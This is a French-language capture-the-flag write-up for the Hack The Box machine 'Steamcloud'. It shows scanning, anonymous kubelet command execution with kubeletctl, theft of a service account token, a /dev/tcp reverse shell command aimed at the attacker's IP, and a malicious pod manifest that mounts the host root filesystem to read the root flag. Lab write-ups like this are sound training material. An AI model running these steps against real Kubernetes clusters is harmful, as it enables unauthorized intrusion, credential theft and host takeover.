# Steamcloud - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-14 17:30 EST
Nmap scan report for 10.10.11.133
Host is up (0.051s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.54 seconds
```

On essaye alors d’inclure tous les ports. On découvre ça:

```bash
2379/tcp  open  ssl/etcd-client?                                                                                                                                                              
| tls-alpn:                                                                                                                                                                                   
|_  h2                                                                                                                                                                                        
|_ssl-date: TLS randomness does not represent time                                                                                                                                            
| ssl-cert: Subject: commonName=steamcloud                                                                                                                                                    
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1                                                          
| Not valid before: 2023-02-14T16:31:43                                                                                                                                                       
|_Not valid after:  2024-02-14T16:31:43                                                                                                                                                       
2380/tcp  open  ssl/etcd-server?                                                                                                                                                              
| tls-alpn:                                                                                                                                                                                   
|_  h2                                                                                                                                                                                        
| ssl-cert: Subject: commonName=steamcloud                                                                                                                                                    
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1                                                          
| Not valid before: 2023-02-14T16:31:43                                                                                                                                                       
|_Not valid after:  2024-02-14T16:31:43                                                                                                                                                       
|_ssl-date: TLS randomness does not represent time                                                                                                                                            
8443/tcp  open  ssl/https-alt
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).      
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).      
|_ssl-date: TLS randomness does not represent time                        
| ssl-cert: Subject: commonName=steamcloud@1676392305                     
| Subject Alternative Name: DNS:steamcloud                                                     
| Not valid before: 2023-02-14T15:31:45                                                        
|_Not valid after:  2024-02-14T15:31:45                                                        
| tls-alpn:                                                                                    
|   h2            
|_  http/1.1                                                                                   
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
```

Après recherche sur ces ports en particulier, il semble que ce soit du kubernetes derrière.

Sur cette adresse : [https://10.10.11.133:8443/](https://10.10.11.133:8443/) on a ça qui est affiché :

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}
```

Sur cette adresse: [http://10.10.11.133:10249/](http://10.10.11.133:10249/) on a :

```json
404 page not found
```

On va donc essayer un petit gobuster et on trouve la page metrics qui nous dit que c’est bien du kube. Rien d’autre donc on attaque un autre port:

```bash
gobuster dir -u https://10.10.11.133:10250/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -k
```

-k est pour ignorer les certificats

```bash
/stats                (Status: 301) [Size: 42] [--> /stats/]
/logs                 (Status: 301) [Size: 41] [--> /logs/] 
/metrics              (Status: 200) [Size: 196356]          
/pods                 (Status: 200) [Size: 37847]
```

Dans pods on tombe sur une grande réponse JSON avec plein d’informations concernant les pods. On sait qu’il y a 7 pods et on a leur noms. Dans logs on a accès aux logs du système mais rien d’intéressant. Maintenant qu’on a les noms on va essayer d’interagir avec. Pour cela il faut kubeletctl

```bash
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
./kubeletctl_linux_amd64 --server 10.10.11.133 pods
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ kube-proxy-n2npj                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ coredns-78fcd69978-zfgnq           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

On remarque alors que nginx est dans le namespace par défaut et n’est pas relié comme un pod kubernetes. On va donc voir sur quels pods on peut tenter de faire une RCE puisque Kubelet autorise l’accès anonyme:

```bash
./kubeletctl_linux_amd64 --server 10.10.11.133 scan rce
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ kube-proxy-n2npj                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ coredns-78fcd69978-zfgnq           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

On tente alors de lancer une commande:

```bash
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "pwd" -p nginx -c nginx
/
```

On est bien sur / donc on va essayer d’avoir plus d’infos:

```bash
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "whoami" -p nginx -c nginx
root
```

On peut d’ailleurs directement lire le flag user:

```bash
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "cat /root/user.txt" -p nginx -c nginx
```

On va donc maintenant faire un reverse shell:

```bash
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "/bin/bash -i >& /dev/tcp/10.10.16.6/9090 0>&1" -p nginx -c nginx
```

Effectivement ça ne marche pas parce que on est monté sur un répertoire différent. On va donc essayer de continuer en executant des commandes de cette façon. En particulier on peut trouver des secrets ici:

```bash
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
a
```

On note toute cela dans des fichiers puis on fait (après avoir installe kubectl et exporté le token en variable d’env):

```bash
./kubectl --token=$token --certificate-authority=../machines/steamcloud/ca.crt --server https://10.10.11.133:8443 auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

On voit donc qu’on a le droit de création de pods sur la machine, on va donc en créer un qui est malveillant à partir du pod nginx déjà existant:

```yaml
cat evil.yml 

apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

```bash
./kubectl --token=$token --certificate-authority=../machines/steamcloud/ca.crt --server https://10.10.11.133:8443 apply -f ../machines/steamcloud/evil.yml 
pod/nginxt created
```

On vérifie la présence:

```bash
./kubectl --token=$token --certificate-authority=../machines/steamcloud/ca.crt --server https://10.10.11.133:8443 get pods
NAME     READY   STATUS    RESTARTS   AGE
nginx    1/1     Running   0          9m1s
nginxt   1/1     Running   0          51s
```

Et enfin pour avoir le flag root:

```bash
./kubeletctl_linux_amd64 --server 10.10.11.133 exec "cat /root/lroot/root.txt" -p nginxt -c nginxt
```